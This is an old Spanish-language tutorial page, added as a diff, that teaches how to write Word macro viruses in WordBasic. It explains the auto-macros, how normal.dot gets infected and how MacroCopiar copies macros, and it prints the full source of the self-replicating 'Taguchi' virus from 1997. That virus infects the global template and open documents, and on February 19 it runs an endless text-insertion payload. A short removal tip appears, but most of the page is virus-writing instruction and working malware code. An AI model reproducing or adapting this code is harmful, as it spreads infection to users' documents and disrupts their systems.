@@ -1,0 +1,344 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="GENERATOR" content="Mozilla/4.51 [en] (Win98; I) [Netscape]">
+   <title>Please title this page. (curso6.htm)</title>
+<!-- Created with AOLpress/2.0 -->
+</head>
+<body text="#000000" bgcolor="#FFFFFF" link="#0000EE" vlink="#551A8B" alink="#FF0000">
+Ahora toca hablar un poco sobre los
+virus de Word. Estos virus se programan
+<p>en un lenguaje llamado WB (wordbasic).
+<p>Si supongo que a muchos de vosotros os suena eso del basic y ten&eacute;is
+mucha
+<p>raz&oacute;n ya que el WB es una variante del basic. A mi me recuerda
+enormente
+<p>al famoso qbasic que ven&iexcl;a con el DOS, sobretodo porque est&nbsp;
+bastante
+<p>estructurado y no hay que poner los engorrosos numeros de linea cada
+<p>vez ;>.
+<p>Supongo que los virus del Word son tan famosos porque desde la aparici&cent;n
+de
+<p>win95 es la forma m s sencilla de infectar un ordenador, porque est&nbsp;
+en
+<p>un lenguaje de alto nivel y cualquier LAMER puede aprender a utilizarlo
+<p>estudianto unos cuantos comandos, y porque por si fuera poco est&aacute;
+en una
+<p>variante del basic, y quien no aprendi&oacute; a programar en Basic
+con la aparici&oacute;n
+<p>de los Amstrad y los Spectrum.
+<p>Aun as&iacute; no me parece una rama de los virus muy interesante, al
+ver
+<p>un virus en ensamblador ,aprecias la belleza de su c&oacute;digo (siempre
+y cuando
+<p>est‚ bien programado) en cambio cuando ves un virus en WB dices - pero
+que
+<p>cutre!!!!!. Algo as&iexcl; como los virus para BAT o los Companion Viruses.
+<p>De todos modos su utilizaci&oacute;n como carriers (programa con el
+que
+<p>empiezas a contaminar un sistema) es bastante interesante. El virus
+Ph33r
+<p>de los australiandos Vlad ,se extend&iacute;a mediante un virus para
+word.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+S&iacute; son cutres pero que co&ntilde;o se reproducen no???.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+En primer lugar &iquest;cuando se ejecuta un Macro?
+<p>En el winword existe un famoso archivo llamado normal.dot en ‚el
+<p>que se almacenan todas las macros existentes en el word. Entre ellas
+<p>est&aacute;n unas macros autom&aacute;ticas que se ejecutan cada vez
+que se
+<p>da cierto evento. Hay 5 macros autom&aacute;ticas ,asociadas a 5
+<p>eventos del sistema.
+<p>autoclose -Se ejecuta cuando se cierra un archivo
+<p>autoopen -Se ejecuta cuando se abre un archivo
+<p>autonew -Se ejecuta cuando se crea un archivo.
+<p>autoexec -Se ejecuta cuando entras en el word.
+<p>autoexit -Se ejecuta cuando sales del word.
+<p>De modo que si tu creas una macro llamada autoclose que visualize
+<p>tu nombre en pantalla. Cada vez que cierres un archivo se
+<p>visualiza&nbsp; tu nombre en pantalla ;>. Esto parece m&aacute;s f&aacute;cil
+que
+<p>la residencia en ensamblador jejejeje.
+<p>Realmente el virus no est&aacute; residente simplemente est&aacute;
+en el normal.dot
+<p>esperando que se ejecute un evento.
+<p>Ahora bien, si recibes un archivo contaminado ,como se copia a tu
+<p>sistema (al normal.dot) si tu normal.dot est&aacute;&nbsp; limpio todav&iacute;a?
+<p>Resulta que en los archivos tambi&eacute;n puedes introducir macros.
+<p>El macro autoopen en un archivo se ejecutar&iacute;a cada vez que abres
+un
+<p>archivo y el autoclose cada vez que lo cierras.
+<p>Ahora bien ese archivo tiene que ser de tipo plantilla si no el macro
+<p>no se podr&iacute;a ejecutar.Los virus de word normalmente aunque no
+sean
+<p>una plantilla ,graban los archivos contaminados como plantilla para
+<p>que puedan ser ejecutados sus macros directamente desde los archivos.
+<p>Esto se hace con el simple comando
+<p>archivoguardarcomo.formato=1
+<p>nota: Como veis los comandos est&aacute;n en Castellano, la verdad es
+que
+<p>esto s&oacute;lo es posible en la versi&oacute;n hispana del word ,pero
+hay que
+<p>fomentar la producci&oacute;n nacional.
+<p>De todas formas si veis el c&oacute;digo de alg&uacute;n virus de word
+en Ingles
+<p>no te preocupes la traducci&oacute;n es practicamente literal para la
+<p>versi&oacute;n castellana.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+y ahora bien &iquest;como copio el virus desde un archivo al normal.dot?
+<p>No es necesario utilizar cosas raras ni punteros ni guardar valores
+<p>en registros como en ensamblador, esto es un lenguaje de alto
+<p>nivel esto se hace con una simple instrucci&oacute;n jejejejeje.
+<p>macrocopiar "doc1:autoclose","global:autoclose"
+<p>Con esta instrucci&oacute;n copio el macro autoclose situado en el
+<p>archivo doc1 al macro autoclose que guardar‚ en normal.dot
+<p>(no se referencia al archivo de macros normal.dot como tal, sino
+<p>que se utiliza la expresi&oacute;n global)
+<p>f&aacute;cil no??. del mismo modo se puede hacer lo contrario
+<p>macrocopiar "global:autoclose","doc1:autoclose"
+<p>para copiar del macro autoclose de global a doc1.
+<p>Tambien se puede sustuir esta expresi&oacute;n por
+<p>macrocopiar "global:autoclose",nombreventana$()+":autoclose"
+<p>Esto copia la macro autoclose de global al archivo que va a ser cerrado.
+<p>nombreventana$() es una funci&cent;n del word que devuelve el nombre
+de
+<p>la ventana abierta.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ahora viene
+una pregunta importante &iquest;donde escribo el virus?
+<p>Mira en el menu de herramientas la opcion macros.
+<p>Te aparecer&nbsp; un bonito editor de macros con todas las macros existentes
+<p>actualmente en tu word y si tienes alguna plantilla abierta te
+<p>proporciona la posibilidad de ver los macros incluidos en dicha
+<p>plantilla
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Otra
+pregunta importante &iquest;como eliminar un virus de word?
+<p>Si sospechas que tienes un virus de word, borra el normal.dot
+<p>de modo que el propio word te crear&nbsp; uno limpio. Con eso limpias
+<p>el normal.dot .Los archivos los puedes abrir con el editor de macros
+<p>en la opcion organizador.
+<p>(abrelos con el editor si los abres con el word estamos en las mismas
+<p>con el normal.dot contaminadito).Y puedes borrar todas macros que
+<p>tengas en el archivo. :> f&aacute;cil ehhh.
+<p>Normalente no hay macros en el normal.dot as&iacute; que si habres el
+editor
+<p>y ves un par de macros ,puedes pensar mal.
+<p>No conozco a nadie que utilice macros unicamente los creadores de virus.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Nuestro primer virus.
+<p>Este virus estar&nbsp; formado por 2 macros una autoclose y otra llamada
+<p>nigro que es el que utilizaremos para saber si est&nbsp; contaminado
+<p>el archivo o el normal.dot
+<p>'***********************************************************
+<p>'*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*
+<p>'* Virus Taguchi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*
+<p>'* (la probabilidad de aprobar es de un 0.05 %)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*
+<p>'*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+*
+<p>'***********************************************************
+<p>Sub MAIN 'este macro definelo como autoclose
+<p>On Error Goto finalizar 'si hay algun error va a finalizar
+<p>'hay etiquetas y saltos condicionales
+<p>'como pod‚is ver.
+<p>Nigro1$ = NombreVentana$() + ":autoclose"
+<p>Nigro2$ = NombreVentana$() + ":nigro"
+<p>Archi$ = LCase$(Right$(NombreArchivoMacro$(NombreMacro$(0)), 10))
+<p>'utilizo la funci&oacute;n Lcase para realizar la comparaci&oacute;n
+<p>'solo en min&uacute;sculas y en Archi$ tendr&aacute;‚ el nombre del
+<p>'archivo que contenga el macro ya sea un archivo de
+<p>'plantilla o el normal.dot
+<p>'utilizo la funci&oacute;n right$ porque nombrearchivomacro$
+<p>'devuelve el nombre con la ruta
+<p>If archi$ = "normal.dot"&nbsp; Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+'si se ejecuta desde el normal.dot
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If infectado = 0 Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Goto contadoc 'si no lo esta contamina el archivo activo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Else
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Goto finalizar 'si lo esta no contamina
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EndIf
+<p>Else 'se ejecuta desde un archivo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If
+infectado = 0 Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Goto contanormal 'contamina normal.dot si no lo esta
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Else
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Goto finalizar 'no contamina porque ya lo est
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EndIf
+<p>EndIf
+<p>Goto finalizar
+<p>MsgBox "virus Taguchi"
+<p>contadoc:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+'contamina archivo abierto
+<p>ArchivoGuardarComo .Formato = 1 'en archivos s&oacute;lo se autoejecutar
+n las
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+'macros que est&aacute;n en plantillas.
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+'Pues creamos la plantilla.
+<p>MacroCopiar "global:autoclose", nigro1$, 1
+<p>MacroCopiar "global:nigro", nigro2$, 1
+<p>ArchivoGuardarTodo 1, 1
+<p>Goto finalizar
+<p>contanormal: 'contamina el normal.dot
+<p>MacroCopiar nigro1$, "global:autoclose", 1
+<p>MacroCopiar nigro2$, "global:nigro", 1
+<p>ArchivoGuardarTodo 1, 0
+<p>Goto finalizar
+<p>finalizar:
+<p>Call Nigro&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+, payload ,llamo a otra macro.
+<p>End Sub
+<p>'anda pero si hay tambien funciones!!!!!
+<p>'que bonito!!!
+<p>'esta funcion definela dentro de la ventana
+<p>'del macro autoclose ya que es llamada desde
+<p>'dicha macro
+<p>Function infectado 'funci&oacute;n que verifica si est&oacute;&nbsp;
+infectado
+<p>'ya sea un archivo o el normal.dot segun el
+<p>'caso devuelve 0 si limpio y 1 si infectado
+<p>infectado = 0
+<p>Archi$ = LCase$(Right$(NombreArchivoMacro$(NombreMacro$(0)), 10))
+<p>'busca entre los macros si est&nbsp; el macro nigro
+<p>'si est&nbsp; es que estar&nbsp; contaminado
+<p>If archi$ = "normal.dot" Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If ContarMacros(1) > 0 Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+For i = 1 To ContarMacros(1)
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If NombreMacro$(i, 1) = "nigro" Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado = 1
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+End If
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Next i
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+End If
+<p>Else
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If ContarMacros(0) > 0 Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+For i = 1 To ContarMacros(0)
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+If NombreMacro$(i, 0) = "nigro" Then
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado = 1
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+End If
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Next i
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+End If
+<p>&nbsp;End If
+<p>End Function
+<p>Sub MAIN 'este procedimiento definelo como nigro
+<p>If D&iacute;a(Ahora()) = 19 And Mes(Ahora()) = 2 Then
+<p>Insertar " * tAgUchI vIrUz * by NIGROMANTE(nEUrOtIc cpU) 1997"
+<p>Goto bucle
+<p>'si es el d&iacute;a 19 de Febrero creo un bucle infinito
+<p>'escribiendo en el archivo abierto nEUrOtIc cpU
+<p>End If
+<p>End Sub
+<p>Supongo que la mayor&iacute;a de estas funciones son f&aacute;ciles
+de entender
+<p>intuitivamente por el nombre, sino pod&eacute;is hacer pruebas con el
+<p>word.
+<p>De todas formas voy a explicar un poco la verificaci&oacute;n de si
+est&aacute;
+<p>contaminado el archivo.
+<p>En primer lugar el virus guarda en archi$() el nombre del archivo
+<p>desde el que fue ejecutado el macro (tened en cuenta que
+<p>en como qbasic las funciones que devuelven texto tienen el simbolo
+<p>$ al final).En nombre del archivo lo obtiene mediante la funci&oacute;n
+<p>nombrearchivomacro$().
+<p>Ahora teniendo ese nombre compara archi$ con "normal.dot" para
+<p>saber si se est&nbsp; ejecutando el macro desde un archivo o desde
+<p>el normal.dot. Si se est&nbsp; ejecutando desde el normal.dot ,
+<p>como es l&oacute;gico no har&aacute;&nbsp; falta contaminarlo jejeje,
+entonces mediante
+<p>la funci&oacute;n infectado mira si el archivo abierto esta contaminado
+<p>si no lo est&aacute;&nbsp; lo contamina y si lo est&aacute;&nbsp; se
+va a la macro
+<p>nigro para realizar el payload. En el caso en que se ejecute
+<p>desde un archivo se hace lo contrario mediante la funcion infectado
+<p>se mira si el normal.dot est&aacute;&nbsp; contaminado si lo est&aacute;&nbsp;
+se va al macro
+<p>nigro y si no lo est&aacute;&nbsp; lo contamina.Guau esto parece un
+trabalenguas
+<p>La funci&oacute;n infectado trabaja por tando de diferente manera seg&uacute;n
+<p>se ejecute desde un archivo o desde el normal.dot.
+<p>Si se ejecuta desde un archivo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado=1 si normal.dot infectado
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado=0 si normal.dot no infectado
+<p>Si se ejecuta desde el normal.dot
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado=1 si archivo infectado
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+infectado=0 si archivo no infectado
+<p>La verificaci&oacute;n de si est&nbsp; infectado o n o ya sea el archivo
+o el
+<p>normal.dot se hara mediante las funciones
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contarmacros(1) que devuelve
+el n&uacute;mero de macros en el archivo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+activo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contarmacros(0) que devuelve el
+n&pound;mero de macros en normal.dot
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nombremacro$(n,1) devuelve el nombre
+del macro numero n
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+dentro del archivo activo
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nombremacro$(n,0) devuelve el nombre
+del macro numero n
